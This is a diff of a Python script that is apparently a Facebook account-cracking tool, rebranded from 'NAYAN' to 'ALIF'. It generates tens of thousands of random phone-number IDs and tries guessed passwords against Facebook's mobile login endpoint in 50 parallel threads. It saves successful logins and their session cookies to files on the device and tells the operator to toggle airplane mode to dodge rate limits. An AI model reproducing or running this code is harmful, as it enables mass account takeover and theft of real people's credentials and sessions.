@@ -89,6 +89,7 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo ="""
+
 \033[0;92m╔══════════════════════════════════════════════╗
 \033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
 \033[0;32m║ ████   ██ \033[0;31m██   ██  \033[0;93m██  ██  \033[0;32m██   ██ \033[0;31m████   ██\033[0;92m ║
@@ -166,11 +167,10 @@ def xr():
     os.geteuid
     os.system("clear")
     print(logo)
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    jalan('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mBD CODE : \033[1;97m016 \033[1;92m, \033[1;97m017 \033[1;92m, \033[1;97m018 \033[1;92m, \033[1;97m019')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    code = input('\033[97;1m[\033[92;1m?\033[97;1m]\033[97;1mENTER CODE  \033[38;5;196m:\033[97;1m ')
-    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m1000\033[1;97m/\033[1;34m2000\033[1;97m/\033[1;32m3000\n \033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 \033[1;91m<>\033[1;92m 92302 \033[1;91m<>\033[1;92m 92301 \033[1;91m<<')
+    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Choose \033[1;91m>>\033[1;92m ')
+    limit = 50000
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -185,36 +185,35 @@ def xr():
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
-        print(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mSIM CODE : \033[1;97m '+code)
-        print(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+tl)
-        print(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mUSE \033[1;34m[\033[1;32mDATA\033[1;97m/\033[38;5;196mWIFI\033[1;34m] ')
-        print(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m YOUR SLECTED SIM \033[1;91m>>\033[1;96m '+code)
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
+        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
+        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
         for love in user:
             pwx = [love[1:]]
             uid = code+love
             for Eman in RimonID:
                 pwx.append(Eman)
                 pwx.append(love)
-            manshera.submit(ncrack,uid,pwx,tl)
-    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
-    print(' \nIDS SAVED IN Nayan_OK.txt')
+            manshera.submit(rcrack,uid,pwx,tl)
+    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in 𝑨𝑳𝑰𝑭/ok.txt,𝑨𝑳𝑰𝑭/cp.txt')
+    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
 
-def ncrack(uid,pwx,tl):
-	#print(user)
-	global loop
-	global cps
-	global oks
-	global agents
-	try:
-		for ps in pwx:
-			pro = random.choice(ugen)
-			session = requests.Session()
-			sys.stdout.write('\r \33[1;92m[NAYAN] [%s] \33[1;92m[OK:\33[1;92m%s\33[1;92m]'%(loop,len(oks))),
-			sys.stdout.flush()
-			
-			free_fb = session.get('https://mbasic.facebook.com').text
-			log_data = {
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
@@ -224,7 +223,7 @@ def ncrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-			header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -239,21 +238,28 @@ def ncrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5481.223 Safari/537.36',}
-            
-			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[7:22]
-				print('\r\r \033[1;32m[NAYAN-OK💣] q '+cid+ '|' +ps+   '  \n \033[1;34m[COOKIE \033[1;91m[💥] = \033[1;92m'+coki+  ' \n\033[1;95m')
-				cek_apk(session,coki)
-				open('/sdcard/MR.NAYAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
-
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(' \n\033[1;97m[\033[1;92mNAYAN-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
+                open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                #print('[𝑨𝑳𝑰𝑭-CP] ' +uid+ '|' +ps+ '')
+                open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r \033[1;91m[\033[1;97m𝑨𝑳𝑰𝑭\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
+        sys.stdout.flush()
+    except:
+        pass
+ 
 xr()
